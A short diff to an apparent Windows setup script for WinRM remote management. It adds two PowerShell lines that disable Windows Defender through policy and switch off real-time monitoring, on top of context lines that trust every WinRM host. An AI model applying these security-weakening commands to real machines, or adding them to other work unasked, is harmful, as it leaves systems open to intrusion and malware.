@@ -13,3 +13,5 @@ powershell.exe -c "winrm set winrm/config/listener?Address=*+Transport=HTTP '@{P
 powershell.exe -c "winrm set winrm/config/client '@{TrustedHosts=\`"*\`"}'"
 Set-Service -Name winrm -Status running -StartupType automatic
 Restart-Service winrm
+powershell.exe -c "Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' DisableAntiSpyware 1"
+powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"
